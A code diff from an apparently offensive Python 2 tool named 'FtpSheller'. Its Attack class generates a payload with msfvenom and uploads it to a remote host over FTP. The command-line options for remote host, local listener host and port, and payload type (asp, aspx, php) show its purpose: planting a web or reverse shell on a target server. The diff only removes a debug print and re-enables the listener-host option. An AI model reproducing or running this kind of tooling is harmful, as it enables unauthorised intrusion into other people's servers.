@@ -71,7 +71,6 @@ class Attack(object):
                     subprocess.call(["msfvenom", ""]) # TODO
 		except Exception, e:
 		    print '[!] Error creating payload!'
-            print self.payload
             ftp.storbinary('STOR {}'.format(self.payload), open(self.payload, 'rb'))
             print '[+] Payload uploaded!'
             ftp.quit()
@@ -100,7 +99,7 @@ if __name__ == '__main__':
     parser = argparse.ArgumentParser(
             description = 'FtpSheller')
     parser.add_argument('--rhost', help = 'Remote host')
-    #parser.add_argument('--lhost', help = 'Local host listener')
+    parser.add_argument('--lhost', help = 'Local host listener')
     parser.add_argument('--lport', help = 'Local port listener')
     parser.add_argument('--payloadType', help = 'Type of payload (asp, aspx, php')
     args = parser.parse_args()
